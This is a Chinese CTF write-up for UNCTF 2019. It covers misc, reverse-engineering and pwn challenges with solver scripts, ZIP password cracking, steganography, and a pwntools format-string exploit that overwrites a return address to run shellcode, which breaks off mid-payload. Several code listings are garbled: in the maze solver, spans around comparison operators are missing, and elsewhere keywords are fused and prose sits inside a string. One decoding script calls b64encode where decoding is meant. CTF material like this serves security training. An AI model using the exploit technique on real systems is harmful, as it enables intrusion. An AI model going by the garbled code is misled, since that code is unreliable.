> 1 else decoded_expression[0] if WARP_CTC: import_module('warpctc_tensorflow') graph = tf.Graph() tf_checkpoint = tf.train.latest_checkpoint(MODEL_PATH) sess = tf.Session( graph=graph, config=tf.ConfigProto( # allow_soft_placement=True, # log_device_placement=True, gpu_options=tf.GPUOptions( allocator_type='BFC', # allow_growth=True, # it will cause fragmentation. per_process_gpu_memory_fraction=0.01 )) ) graph_def = graph.as_graph_def() with graph.as_default(): sess.run(tf.global_variables_initializer()) # with tf.gfile.GFile(COMPILE_MODEL_PATH.replace('.pb', '_{}.pb'.format(int(0.95 * 10000))), \"rb\") as f: # graph_def_file = f.read() # graph_def.ParseFromString(graph_def_file) # print('{}.meta'.format(tf_checkpoint)) model = GraphOCR( RunMode.Predict, NETWORK_MAP[NEU_CNN], NETWORK_MAP[NEU_RECURRENT] ) model.build_graph() saver = tf.train.Saver(tf.global_variables()) saver.restore(sess, tf.train.latest_checkpoint(MODEL_PATH)) _ = tf.import_graph_def(graph_def, name=\"\") dense_decoded_op = sess.graph.get_tensor_by_name(\"dense_decoded:0\") x_op = sess.graph.get_tensor_by_name('input:0') sess.graph.finalize() def predict_img(img_bytes): batch = get_image_batch(img_bytes) return predict_func( batch, sess, dense_decoded_op, x_op, ) 然后重新生成一个图片进行测试: from code import gen_exp_pic from predict import predict_img from PIL import Image import io def image_to_byte_array(image:Image): imgByteArr = io.BytesIO() image.save(imgByteArr, format=\"jpeg\") imgByteArr = imgByteArr.getvalue() return imgByteArr r = gen_exp_pic() # (, '843+479*161', 77962) img = image_to_byte_array(r[0]) predict_img(img) # '843+479*161' 可以看到识别结果还是比较准确的。 3）计算表达式并提交 使用代码获取验证码进行识别，并提交计算结果，获取flag,代码如下： #!/usr/bin/env python # coding=UTF-8 import re import time import hashlib import base64 import json import requests from predict import predict_img # 代理设置 proxy = 'http://127.0.0.1:8080' use_proxy = False MY_PROXY = None if use_proxy: MY_PROXY = { # 本地代理，用于测试，如果不需要代理可以注释掉 'http': proxy, 'https': proxy, } headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36\", 'Upgrade-Insecure-Requests': '1', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en,ja;q=0.9,zh-HK;q=0.8', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', } def md5(data): md5 = hashlib.md5(data.encode('utf-8')) return md5.hexdigest() def http_req(url, data=None, method='GET', params=None, json=False, cookies=None, proxies=MY_PROXY): if json: method = 'POST' json = data data = None if method == 'GET': params = data data = None r = requests.request(method, url, headers=headers, verify=False, json=json, params=params, data=data, cookies=cookies, proxies=MY_PROXY) return r def calc_req(url, data=None): global my_cookie result = http_req(url, data=data, cookies=my_cookie) my_cookie = result.cookies return result calc_url = \"http://127.0.0.1:8800/\" calc_pic = calc_url + \"imgcode\" calc_check = calc_url + \"checkexp\" def print_round(txt): round_txt = re.search(\"round.*\", txt) if round_txt: print(round_txt[0]) my_cookie = { } r = calc_req(calc_url) print_round(r.text) # 由于10次图片识别不一定每次都正确，采用循环直到发现flag while True: pic = calc_req(calc_pic) exp = predict_img(pic.content) result = eval(exp) time.sleep(0.3) r2 = calc_req(calc_check, {'result': result}) print_round(r2.text) if len(r2.history) == 0: # 没有302重定向，则输出结果 print(r2.text) break 结果如下，有可能输出的round不同，因为有时验证码会识别错误，重新开始计算round: round: 1 / 10 round: 2 / 10 round: 3 / 10 round: 4 / 10 round: 5 / 10 round: 6 / 10 round: 7 / 10 round: 8 / 10 round: 9 / 10 round: 10 / 10 this is what you want: flag{9cd6b8af2cad231c1125a2c7ce8f3681} 快乐游戏题 无 平淡生活下的秘密 原理知识 1） LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位（LSB），而人类的眼睛不会注意到这前后的变化，可以达到隐写的目的 2） png图片是一种无损压缩的位图片形格式，也只有在无损压缩或者无压缩的图片（BMP）上实现lsb隐写。如果图像是jpg图片的话，就没法使用lsb隐写了，原因是jpg图片对像数进行了有损压缩，我们修改的信息就可能会在压缩的过程中被破坏。而png图片虽然也有压缩，但却是无损压缩，这样我们修改的信息也就能得到正确的表达，不至于丢失。 解题过程 1）使用stegsolve分析 2）发现blue plane 0有一个二维码 扫码得到字符串，Y0u're_so_smart,but_it's_not_the_end 看来还没结束，仔细发现blue plane 0上面有一些像素点，应该知道还有LSB隐写数据 所以我们点击Analyse→Data Extract，选中LSB First、RGB、RGB的plane0 发现PK开头，明显是一个压缩包，save bin保存，解压，显示文件已损坏 用WinRAR自带的修复工具修复一下，WinRAR→工具→压缩文件修复 显示解压需要密码，就是之前二维码扫出来的那个字符串 得到flag ，unctf{This_i5_a_easy_lsb_steg} 亲爱的 原理知识 1） 文件合成。 解题过程 1）音乐文件听歌识曲分析是什么歌曲，分离文件。 2）根据提示找到对应的评论为解压密码。 3）解压完图片，把图片进行分离得到word。 4）word的右下角就拿到了flag的图片。 打开音乐文件，并进行听歌识曲。分辨出来是什么歌曲。 使用foremost分离文件得到zip文件 解压发现有密码，提示有说是qq音乐的这个时间段。根据知道的歌名 去找这个评论 得到解压密码:真的上头 解压得到图片 分离图片得到又一个zip 解压发现不是一个简单的zip。而是一个docx。改完后缀打开docx 上来就结婚?? 这里就有两个解了，1是直接从word->image1.png\">https://ctfwp.wetolink.com/2019unctf/dear-\\>image1.png 第二种就是慢慢发现flag在右下角比较明显 得到flag文件 无限迷宫 原理知识 1） opencv处理图片，过滤颜色，查找轮廓，直线检测等知识的运用 2） graph的构造，寻路方法的算法 3） 使用python处理zip文件 解题过程 问题分析 打开下载的图片是一个迷宫，如图1。 图 1: 下载的图片 图片比较小，但是文件很大，使用010 editor打开下载的图片，发现文件后面有很长的附加数据，如图2. 看文件开头为PK,可能是zip文件。 图 2: 010 editor截图 于是使用7-zip打开图片文件,可以看到是加了密的zip文件，里面有个flag.jpg，如图3。 图 3: 7-zip截图 根据题目的提示:上下左右，1234。猜测迷宫的路径可能就是zip的密码，每一步所走的方向,即上下左右对应1234. 解决方案 因为迷宫为图片，手工走迷宫太累，使用图像处理的方法解决问题。 使用图像处理的方法走迷宫需要下面几个步骤： 识别出开始和目标位置 识别出迷宫的网格，才能确定走的每一个格子 根据识别出的网格，转换迷宫图片为graph。 使用寻路方法，寻找开始位置的格子到目标位置格子的最短路径。 把找到的路径转换为每一步要走的方向 转换方向为对应的1234，获得zip文件的密码 转换为代码如下: #!/usr/bin/env python3 # coding=utf-8 # 安装必备工具和库 # apt-get install unzip # pip3 install numpy # pip3 install opencv-python from os.path import isfile, join from os import listdir import os import shutil import subprocess from collections import Counter import math import cv2 as cv import numpy as np import logging def find_color_max_rect(img, lower, upper): ''' 查找lower-upper指定的颜色区域最大的轮廓, lower, upper为hsv颜色空间''' hsv = cv.cvtColor(img, cv.COLOR_BGR2HSV) # 过滤出红色，(指示起点的图片) binary = cv.inRange(hsv, lower, upper) # 闭运算，消除起始图片中的空洞 kernel = np.ones((20, 20), np.uint8) closing = cv.morphologyEx(binary, cv.MORPH_CLOSE, kernel) # 查找起始图片的轮廓 contours, _ = cv.findContours( closing, cv.RETR_EXTERNAL, cv.CHAIN_APPROX_SIMPLE) logging.info(\"find start contours:%d\" % len(contours)) # 返回面积最大的轮廓 max_area = 0 for c in contours: c_area = cv.contourArea(c) if c_area > max_area: max_area = c_area max_c = c return cv.boundingRect(max_c) def find_start(img): ''' 查找开始位置--迷宫开始图片的矩形''' lower_red = np.array([0, 0, 100]) upper_red = np.array([15, 255, 200]) return find_color_max_rect(img, lower_red, upper_red) def find_end(img): ''' 查找结束位置--迷宫目标图片的矩形''' lower_yellow = np.array([20, 0, 100]) upper_yellow = np.array([30, 250, 250]) return find_color_max_rect(img, lower_yellow, upper_yellow) def show_rects(img, rects): \"显示矩形区域\" ret = img.copy() for [x, y, w, h] in rects: cv.rectangle(ret, (x, y), (x+w, y+h), (0, 0, 255), 2) cv.imshow('rects', ret) cv.imwrite('show.jpg', ret) cv.waitKey(0) def uniq_lines(lines, precision=5): '''按照precision指定的误差统一直线''' sort_lines = lines.copy() sort_lines.sort() uniq_sort_lines = list(set(sort_lines)) uniq_sort_lines.sort() prev = uniq_sort_lines[0] result = [prev] for p in uniq_sort_lines[1:]: diff = abs(p - prev) if diff > precision: result.append(p) else: # 在误差范围内，纠正上一个值，保存为两条线的中间值 mp = min(p, prev) result[-1] = (mp + int(diff/2)) prev = p return result def find_lines(img, min_length=50): \"查找线条，返回[horz_lines, vert_lines]\" src = cv.cvtColor(img, cv.COLOR_BGR2GRAY) src = cv.GaussianBlur(src, (5, 5), 0) edges = cv.Canny(src, 50, 150, None, 3) # 霍夫变换检测直线 lines = cv.HoughLinesP(edges, 1, np.pi / 180, 50, None, min_length, 10) # 把误差较小的直线合并 horz_lines = [] vert_lines = [] for ls in lines: x1, y1, x2, y2 = ls[0] if y1 == y2: horz_lines.append(y1) elif x1 == x2: vert_lines.append(x1) horz_lines = uniq_lines(horz_lines) vert_lines = uniq_lines(vert_lines) return [horz_lines, vert_lines] def clear_rect(img, rect): \"清除img中rect指定的区域图像\" x, y, w, h = rect img[y:y+h, x:x+w] = 255 return img def best_grid_size(grids): \"返回最合适的grid大小\" items = grids[0] diffs = [x-y for x, y in zip(items[1:], items[:-1])] items2 = grids[1] diffs2 = [x-y for x, y in zip(items2[1:], items2[:-1])] c = Counter(diffs+diffs2) return c.most_common(1)[0][0] def make_grid_pos(length, grid_size): '''根据网格大小生成网格线位置''' return [i*grid_size for i in range(int(length/grid_size)+1)] def find_grid_lines(img, start_rect, end_rect, min_length=50): \"查找图片的网格线\" img2 = img.copy() # 清理掉开始和结束的图片,提高精确度 img2 = clear_rect(img2, start_rect) img2 = clear_rect(img2, end_rect) grids = find_lines(img2, min_length) # 使用查找到的线条重新生成网格线，防止漏掉某些线 grid_size = best_grid_size(grids) y, x, _ = img.shape hls = make_grid_pos(y, grid_size) vls = make_grid_pos(x, grid_size) return [hls, vls] def show_grid(img, horz_lines, vert_lines): '''显示网格线''' ret = img.copy() for y in horz_lines: cv.line(ret, (0, y), (10000, y), (255, 0, 0), 2) for x in vert_lines: cv.line(ret, (x, 0), (x, 10000), (255, 0, 0), 2) cv.imwrite(\"show_grid.jpg\", ret) cv.imshow(\"grid\", ret) cv.waitKey(0) def in_thresh(source, target, thresh): '''是否在阈值范围内''' return target-thresh = w*0.8: return True return False def is_vert_wall(img, x, y, grid_size, precision=3): \"是否是垂直方向的墙 x,y为图片坐标\" w = precision*2 h = int(grid_size / 2) # 取中间的一半长度进行测试 x = x - precision y = y + int(h/2) w = fix_x(img, x+w)-x h = fix_y(img, y+h)-y x = fix_x(img, x) y = fix_y(img, y) count = count_range_color(img, x, y, w, h, wall) logging.info(f\"x:{x}, y:{y}, w:{w}, h:{h} count:{count}\") if count >= h*0.8: return True return False def check_wall(img, grid_lines, x, y): \"检测x,y指定格子四周是否有墙, 返回[上, 下, 左, 右]是否有墙的bool值\" logging.info(f\"check wall x:{x}, y:{y}\") hls, vls = grid_lines grid_size = min(hls[1]-hls[0], vls[1]-vls[0]) # left = x * grid_size + vls[0] # top = y * grid_size + hls[0] # right = left + grid_size # bottom = top + grid_size left = vls[x] right = vls[fix_v(x+1, len(vls)-1)] top = hls[y] bottom = hls[fix_v(y+1, len(hls)-1)] logging.info(f\"left:{left}, right:{right}, top:{top}, bottom:{bottom}\") top_wall = is_horz_wall(img, left, top, grid_size) bottom_wall = is_horz_wall(img, left, bottom, grid_size) left_wall = is_vert_wall(img, left, top, grid_size) right_wall = is_vert_wall(img, right, top, grid_size) return [top_wall, bottom_wall, left_wall, right_wall] def find_in_range_pos(ranges, v): '''ranges必须为升序列表， 查找v在ranges中的第一个位置索引''' for idx, v2 in enumerate(ranges): if v2 >= v: return idx return None def find_grid_pos(img, grid_lines, x, y): \"查找图像坐标x,y所在的格子\" hls, vls = grid_lines x_pos = find_in_range_pos(vls, x) - 1 y_pos = find_in_range_pos(hls, y) - 1 return [x_pos, y_pos] def rect_center(rect): '''计算矩形中心点''' x, y, w, h = rect return [x+int(w/2), y+int(h/2)] # -------------------------------- maze 算法 def format_node(x, y): \"格式化节点的表示\" return f\"{x}-{y}\" def generate_graph(img, grids): \"从图片中生成graph\" hls, vls = grids width = len(vls)-1 height = len(hls)-1 verticies = 0 edges = 0 graph = {} logging.info(f\"width:{width}, height:{height}\") for x in range(width): for y in range(height): verticies += 1 node = format_node(x, y) graph[node] = set() top, down, left, right = check_wall(img, grids, x, y) if x >= 1: if not left: graph[node].add(format_node(x-1, y)) edges += 1 if x+1 = 1: if not top: graph[node].add(format_node(x, y-1)) edges += 1 if y+1 y1: directs.append('2') elif x2 x1: directs.append('4') else: logging.error(f\"error direction prev:{prev} current:{curr}\") prev = curr return ''.join(directs) def solve_maze(filename): '''解一个迷宫图片，返回每一步的路径''' img = cv.imread(filename) start = find_start(img) end = find_end(img) logging.info(f\"image {filename} start pos: {start}, end pos: {end}.\") # cv.imwrite(\"out.jpg\", img) # show_rects(img, [start, end]) # 格子的最小长度 min_len = min(start[2], start[3], end[2], end[3]) # 获取网格线 grids = find_grid_lines(img, start, end, min_len) # show_grid(img, grids[0], grids[1]) start_center = rect_center(start) start_pos = find_grid_pos(img, grids, start_center[0], start_center[1]) end_center = rect_center(end) end_pos = find_grid_pos(img, grids, end_center[0], end_center[1]) logging.info(f\"start grid pos:{start_pos}, end grid pos:{end_pos}.\") # check_wall(img, grids, x, y) g = generate_graph(img, grids) start_node = format_node(start_pos[0], start_pos[1]) end_node = format_node(end_pos[0], end_pos[1]) return [g, shortest_path(g, start_node, end_node)] # --------------------------------- zip操作 zip_tmp = 'ziptmp/' def unzip_file(filename, password): \"解压zip文件，返回解压的文件列表\" # 先解压到临时目录中 if os.path.exists(zip_tmp): shutil.rmtree(zip_tmp) os.mkdir(zip_tmp) subprocess.run(['unzip', '-o', '-P', password, filename, '-d', zip_tmp]) files = [f for f in listdir(zip_tmp) if isfile(join(zip_tmp, f))] print(f\"unzip files:{files}.\") # 然后把文件移动出来 for f in files: if os.path.exists(f): os.unlink(f) shutil.move(join(zip_tmp, f), \"./\") return files logging.getLogger().setLevel(logging.WARN) count = 0 fname = \"infinity_maze.jpg\" while True: g, route = solve_maze(fname) answer = get_direction(route) files = unzip_file(fname, answer) count += 1 print(f\"count: {count}\") fname = \"flag.jpg\" if not fname in files: break print(\"over!\") 不断地解决迷宫，解压文件，经过128次之后，最终获得flag.txt文件，如图4。 图 4: 代码结果 注意这里解压zip文件使用了linux下的unzip工具，可以自动识别解压jpg文件末尾的zip文件。如果用python实现需要先提取出zip文件，再进行解压。 信号不好我先挂了 原理知识 1） 两张图片进行了快速傅里叶变换相加之后生成了一张图片。并将一张图片的信息隐藏起来。 2） 我们需要做的就是逆向操作，将变换后的图片再进行快速傅里叶变换减去原图的快速傅里叶变换之后再进行反傅里叶变换得到隐藏的水印信息。 解题过程 1） 下载文件得到一个 apple.png。 2） 使用Stegsolve打开,lsb frist查看最低位，save bin 得到一个zip文件。 3） 压缩包没有密码，解压得到pen.png,根据这两张图片的名字联想到（I have apple，I have pen bong!! apple-pen.😉）,是要用对两张图片一起进行操作。又根据题目的名字：《信号不好我先挂了》。联想到《信号与系统》这门炒鸡难的学科。所以使用快速傅里叶变换对着两张图片进行操作得到隐藏的水印信息。 4） 写python脚本进行解密，得到flag:unctf{9d0649505b702643}. 压缩大礼包 原理知识 1） zip压缩的缺陷 2） CRC32校验 3） 文件二进制操作 4） 1.去除压缩包后缀 2.解压后为没有密码的压缩包，内容是假的。真正的下一个压缩包用二进制写在注释内 3.第三个压缩包是伪加密 4.明文爆破（123#qwe!） 5.第5个压缩包是CRC32爆破（welc0m eTo7 his_un _ctf） 6.第6个压缩包加密的，密码在注释内，使用不可见字符，解压密码用摩斯密码表达(-..- ..--- ...-- ...-- ...-. --.-. ..-. ----. ----.)(X233$@F99) 7.解压出来是一张图片6.jpg，图片内加了一个压缩包，需要修复文件头 8.最后解压出来的一个压缩包数字爆破即可得到flag.txt。 解题过程 发现是一个名称为1的文件，根据题目提示添加后缀rar，改为1.rar，解压得到2.rar 2解压出来的txt无用，下一个压缩包藏在注释里 把十六进制文件复制到HxD保存，得到压缩包命名为3.zip 发现3.zip内有两个文件，解压需要密码，爆破不出来，猜测是伪加密 在kali中直接解压或者通过HxD等软件修改加密位，解压得到4.zip和readme.txt。 解开5.zip需要密码 打开看readme.txt，只是简单的文字。 4.zip内也有readme.txt，猜测可能是明文攻击,把readme.txt压缩成zip，对比CRC32，确认是明文攻击 使用工具Advanced ZIP Password Recovery进行明文爆破攻击。爆破成功，解压密码为123#qwe! 打开5.zip,发现有好几个txt,内容都比较小，解压需要密码，猜测是CRC32爆破 使用脚本进行CRC32爆破，得到密码welc0meTo_7his_un_ctf_ 打开6.zip,发现有隐藏注释，复制到notepad++或者sublime，设置显示不可见字符 看到内容猜测，可能是摩斯密码，“.”代表短“-”代表长，解密得X233$\\@F99 解压后得到一张图片，怀疑可能是图种。Binwalk分析有东西。然后直接foremost命令分离 分离出来的压缩包损坏了，修复一下 得到最后一个压缩包，弱密码爆破，四位纯数字，密码是8745 得到flag.txt base64解密，得到flag unctf{D0y0U_1!kE_rAR?} 云深不知处 原理知识 1) 云影密码 解题过程 1）打开浏览器，访问目标主机下载压缩包 2）打开压缩包，可以发现有一个txt文件，打开后可以看到其中内容如下： 可以看到字符由01248构成，可以猜到是云影密码，解密方式如下： 0为间隔字符，其他数字由加法表示，如本题第一个字母2+4+2+4+2+8+2+1=25 为Y 通过解密可得密码：youaremyhero 长安十二时辰 原理知识 1） 信息的搜集 2） 栅栏密码的加密方式：把文本按照一定的字数分成多个组，取每组第一个字连起来得到密文1，再取每组第二个字连起来得到密文2……最后把密文1、密文2……连成整段密文。 解题过程 浏览图片，在微博搜索长安十二时辰网络传信，找到相关制作组微博和相关解密教程 在制作组微博找到望楼密码传信教程文件，寻找题目要求，“小望楼“的信号图 解密附件图片内容，得到信息 117 102 115 115 95 121 110 123 99 95 101 125 99 109 95 115 97 116 49 49 48 53 根据题目信息“扔掉密码本“，“现代编码”，猜想是ASCII码，转字符 得到字符串 ufss_yn{c_e}cm_sat1105 根据题目“越过栅栏”，猜想是栅栏密码，解密flag为 unctf{m1sc_1s_s0_ea5y} RE 666 解题过程 File看文件信息， 打开它。让输入一串key，随便输入一些，说长度错误。 拖入ida打开，找到程序入口，main函数，和关键函数strcmp()，encode() 在main函数里看到了需要2个条件才能获取flag一个是长度为key， key为全局变量 为0x12 也就是18个字符。 在main函数中发现是变量s和enflag进行比较，一致则输出youareright， 而s是经过encode后的字符， enflag()内容: 将前三个字符转化为ascii，然后存放到一个数组里 得到了加密后的字符串，接着查看encode()函数，看看它的加密算法 加密的过程是将用户输入的字符串，拆分成了3组，每组进行异或和加减运算之后累计到 一个变量里，将这个变量跟enflag做比较。 分析完成，编写脚本: enflag=[0x69, 0x7A, 0x77, 0x68, 0x72, 0x6F, 0x7A, 0x22, 0x22, 0x77, 0x22, 0x76, 0x2E, 0x4B, 0x22, 0x2E, 0x4E, 0x69] v3=[] v4=[] v5=[] v7=18 flag='' fori inrange(0,len(enflag),3): v5.append((enflag[i]^v7)-6) v4.append((enflag[i+1]^v7)+6) v3.append(enflag[i+2]^v7^6) forj inrange(v7/3): flag+=chr(v5[j])+chr(v4[j])+chr(v3[j]) print flag Flag:unctf{b66_6b6_66b} BabyMips 原理知识 Mips架构的逆向是路由器漏洞挖掘的基础 解题过程 打开ubuntu，使用qemu模拟执行mips程序 使用ghidra进行静态分析 发现核心函数为4007a0和401878，进入分析 混淆较为严重，但是还是可以根据字符串以及移位运算特征识别出为改了表的base64 进入第二个函数分析 可以一开始的三个函数可以比较容易看出是rc4的s盒初始化，打乱s盒以及产生加密流的操作，因此可以初步判定为rc4加密算法 我们有了密文，解密所需要的数据有 base64置换表，以及rc4的密钥 通过静态分析可以基本上获得这些数据 编写脚本解密即可 babyre 解题过程 1、 使用IDA打开二进制文件，可以看到main函数如下： 2、 首先可以看到输入长度限制为32 3、 进入check后可以看到进一步的输入检查，限制为0-9a-z 4、 和某个表进行异或操作得到result，找到那个表t 5、 按照异或步骤，以最后strcmp中的target和表进行异或解码，即可得到结果 BabyRe2 解题过程 1）ida打开程序找到main函数 2）分析加密算法 首先会验证输入的flag里面是否含有-，若没有就会报错；然后验证输入的前六位UNCTF{以及最后一位}。 当满足上述全部条件就会进入验证。将括号内部以-为判断标识进行截断，分两段进行验证 这是第一段验证 这是第二段验证，点击进入函数内部 这里就是第二段加密以及密文验证 3）编写两段解密脚本，拼接得到flag BabyXor 解题过程 打开题目文件题目应该与Xor有关。 拖入ida进行查看。 发现段被修改。 使用OD调试 发现有0x31000个数据与0x23进行异或加密，并且最后跳转向了0x40c4a0 正好为.text段地址的大小，所以是text段与0x23进行了异或 所以改回来 修改EntryPoint到真正的OEP 保存文件程序正常运行 此时打开ida进行静态分析 程序恢复正常，查看main函数： 有3个函数对unk_435dc0进行了操作:sub_40108C sub_401041sub_4010C3 查看unk_435dc0， 发现是占了4 byte的一些数据。 接着分析函数: sub_40108C 有2个参数分别是a1和a2a1为刚刚传入的unk_435dc0 a2则是一个常量为56这个函数是将a1的值进行变量并根据当前循环次数进行异或 56则是sizeof的大小 第二个函数sub_401041： 3个参数a1 ,a2 ,a3:a1为unk_435dc0 a2为dword_435DF8a3为56，同为sizeof的大小 同样为一串字符这个函数是将a1和[a2+1]的值进行异或运算后的返回结果与当前循环次数运算 第三个函数sub_4010C3: a1: 并没有参与运算 a2: 是第二个函数sub_401041的运算结果： a3:是dword_435E30 这个函数是将a2和[a3-1]的值进行异或运算后的返回结果与当前循环次数运算 然后与其他的函数的返回值进行拼接 但是它的循环次数是13次少了一位 在14行发现将dword_435e30的第一个字母与dword_435df8的第一个字母进行了异或 运算也就是‘- 最后根据运算顺序进行逆推得到异或加密前的数据即为flag: Reverse脚本如下: #coding:utf-8 List1 =[102, 109, 99, 100, 127, 55, 53, 48, 48, 107, 58, 60, 59, 32] List2 =[55, 111, 56, 98, 54, 124, 55, 51, 52, 118, 51, 98, 100, 122] List3 =[26, 0, 0, 81, 5, 17, 84, 86, 85, 89, 29, 9, 93, 18] defre_sub_1(value1): ret ='' fori inrange(len(value1)): ret +=chr(value1[i]^i) returnret defre_sub_2(value1,value2): ret ='' tmp =0 fori inrange(1,len(value2)): tmp =value1[i-1]^value2[i] tmp =tmp^value1[i] ret +=chr(tmp) ret =chr(value2[0])+ret returnret defre_sub_3(value1,value2,value3): ret ='' tmp =0 fori inrange(len(value3)-1): tmp =ord(value2[i])^value3[i+1] ret +=chr(tmp^i) ret =chr(value3[0]^ord(value2[0]))+ret returnret flag1 =re_sub_1(List1) flag2 =re_sub_2(List1,List2) flag3 =re_sub_3(0,flag2,List3)#第一个参数任意 print flag1+flag2+flag3 Flag:flag{2378b077-7d6e-4564-bdca-7eec8eede9a2} easy reverse 解题过程 使用IDA32打开文件,找不到main()函数，选择从字符串入口 Shift+F12打开字符串窗口发现 关键字符串，点进去 利用交叉索引到调用函数F5 前面是定义的字符串 分析程序可以知道：输入的格式必须为unctf{*************}且长度须为27 由该for循环可以知道输入的字符必须为0~9,a~z,A~Z 该字符串为UNCTFisv3ryin4r3stin9 该判断把输入的值（输入到v8）当作数组v21的下标值取出对应字符，当满 足最后组成的字符串为v14（v15开头）“UNCTFisv3ryin4r3stin9”时即为正确的pass 好了，这就是本题思路。 接下来写exp 得到KDsJv8ilTho8dUhTij8dZ所以flag为：unctf{KDsJv8ilTho8dUhTij8dZ} easy_android 解题过程 使用反编译工具观察程序流程,发现纯java层面上的验证 从资源中取得一个string 查看这个string 为app_name 值为 themix 会对输入和这个str传入调用d.a() 查看函数内容 而后 把这三个参数一起传入 e().a()中 观察内容 观察操作首先对输入进行和传入的app_name进行xor 而后进行 分割 调用b.a()方法经过分析 可以发现是求hash的操作 而后和构造函数中初始化的字符串进行对比 写脚本爆破 脚本写的足够优雅 很快就能爆破出来 加上UNCTF{}外壳提交 easy_Maze 原理知识 1） 求逆矩阵的公式为： 2） 求逆转矩阵公式：a[i][j]=a[j][n-i-1]. 解题过程 首先使用IDA打开，F5分析主函数。如下图所示，看到很多数字，根据题目名称可以判断这是迷宫里的数值，我们又看到下面Step_0()和Step_1()函数对矩阵进行了操作。 跟进Step_0()，这里进行的操作就是遍历整个矩阵并进行arr[i][j]=src[j][n-i-1]，并将值传给v7。其实就是逆转矩阵的操作。 跟进Step_1()，细心分析代码，其中getA()是得到矩阵的行列值|A|,getAStart()是计算伴随矩阵A*。下面的for循环就是计算得到矩阵的逆矩阵A-1。求逆矩阵的公式为： 最后分析Step_2(),又是一顿代码分析，w,a,s,d分别代表上，左，下，右，再看下面v10和v9判断迷宫为7*7的矩阵。 提取矩阵值，写脚本解题，得到正确迷宫，得到迷宫路径即为flag. easyvm 解题过程 简单的用c++模拟了一下汇编运算 1、 首先main函数中可以看到flag长度为32字节 2、 其中unk_602080和unk_6020A0数组可以找到 3、 在sub_400C1E中可以找到v3的初始化 4、 然后查看函数sub_400806，还其中的case的每个操作函数（详见源码） 5、根据*(a1+8)指针的变化可以看到实现了指令运行逻辑如下 // data[i]=0xCD^data[i-1]^(input[i]-i) /* loop: mov reg1,input[reg3] dec reg1,reg3 xor reg2,reg1 mov reg1,0xCD xor reg1,reg2 cmp reg1,data[i] mov reg2,reg1 jz continue return 0 continue: inc reg3 cmp reg3,const jb loop return 1 */ 最后对着逆就ok了 old17.rtf Hint OFFICE 2017年某CVE 我们用office打开它会发生什么呢 解题过程 t=[0x8B,0xfc,0x45,0x8b] b=[0xde,0xb2,0x6,0xdf,0xcd,0x87,0x72,0xe9,0xbf,0xc8,0x77,0xee,0xef,0x9f,0x7c,0xbe,0xb8,0xc8,0x23,0xed,0xbb,0xcc,0x73,0xef,0xed,0xc5,0x7c,0xb8,0xee,0xce,0x7c,0xb9,0xbf,0xc8,0x7c,0xbf,0xbd,0x9d,0x38,0xaa] s=\"\" for i in range(0,len(b),4): s+=chr(t[0]^b[i]) s+=chr(t[1]^b[i+1]) s+=chr(t[2]^b[i+2]) s+=chr(t[3]^b[i+3]) print s rookie_reverse 解题过程 运行程序,发现需要输入flag 使用ida查看伪c代码 分析后发现需要满足字符串比较相同的要求,于是分析上面的程序过程 发现有一个循环,将输入的字符串的每一个字符与0x16异或,然后加了1,再赋值回去,然后判断是否与指定字符串相等,所以编写脚本如下 先将字符ascii值减1,然后再与0x16异或一遍,因为字符与同样的字符异或两次会等于本身,所以我们得到了答案 Very_Easy_Re 解题过程 点开程序，随便输入一点东西，得到 进入IDA，通过字符串搜索进入主函数 看到 这里的时候点进去 发现应该是一个base64加密，而且密码表都和网上的一样 再往下看 只是很简单的将上面加密之后的字符串位移了一下 再往下看就找到了需要处理的字符串 根据上述加密过程倒推回去写出解密脚本 import base64 a = \"WV6EWF[8dGU5]Y没事，应该不难 解题过程 main的构建函数和析构函数 + 精简版的base64是否还能看出 解题思路路 首先，main函数中的所有内容都是没有⽤用的，全是虚假内容，之后通过区段表发现 这两个区段中存在不不⽌止⼀一个函数，说明有不不⽌止⼀一个函数在main之前和之后运⾏行行 跟进函数发现其中⼀一个在main之前的函数会将scanf和printf给⽆无效化 会在main之后的函数⾥里里进⾏行行真正的解密流程，就是个变表的base64，还被精简过了 奇怪的数组 原理知识 1） 程序逻辑首先检查了所输字符串是否有 flag{}包裹。然后两个一组进行检查， 由函数 char2hex 的代码及函数名可知， 该函数的作用为将字符转换成对应的 16 进制数返回。 返回后的 16 进制与 checkbox 的对应项进行对比。全部对比成功即可得到 flag 解题过程 1） IDA 载入程序并找到 main 函数， F5 反编译获得结果如下图所示： 2） 阅读程序执行逻辑，编写脚本解出 flag 调试器的初体验 原理知识 1） 被壳保护的程序难以被反汇编工具分析 2） VMP 壳检测到调试器时会弹出提示信息 解题过程 1） 将程序拖入 exeinfo 发现程序被加了 VMP 壳 2） 结合程序名分析，将程序拖入 OllyDebug， F9 运行， 发现 VMP 检测到调试器后的提示信息被设置 为一段 base64，其密文如下： 3） 将 base64 密文解密即可得到 flag，解密脚本如下： import base64 print(base64.b64encode(\"ZmxhZ3sxNmNlYTM3ZTUzNDA1YThiMWl4YTdkZTlxOWU4ZWRkMX0=\")) 解密结果为: flag{16cea37e53405a8b1b8a7de219e8edd1} PWN babyfmt 原理知识 1） Printf的漏洞和shellcode 解题过程 1）先确定buf的偏移，并ebp leak，这样就可以推算出ret和buf的地址，然后通过%{}$hn写入ret为buf的下半部分，然后下半部分恰好放置shellcode，这样就可以执行shellcode拿到shell 2)Exp: #!/usr/bin/python2.7 # -*- coding: utf-8 -*- from pwn import * context.log_level = \"debug\" context.arch = \"i386\" elf = ELF(\"babyfmt\") sh = 0 lib = 0 def pwn(ip,port,debug): global sh global lib if(debug == 1): sh = process(\"./babyfmt\") else: sh = remote(ip,port) sh.recvuntil(\"Please input your message:\") payload = \"%22$p\" sh.send(payload) ebp = int(sh.recv(10),16) ret = ebp - (0xffb66408 - 0xffb663ec) buf_addr = ebp - (0xffb66408 - 0xffb66390) payload = p32(ret) + p32(ret + 2) + \"%.\" + str(buf_addr % 0x10000 + 0x28 - 7) + \"d%4$hn\" payload += \"%.\" + str((buf_addr >> 16) - (buf_addr % 0x10000) - 0x28 - 2) + \"d%5$hn\" payload = payload.ljust(0x28,'\\x00') payload += 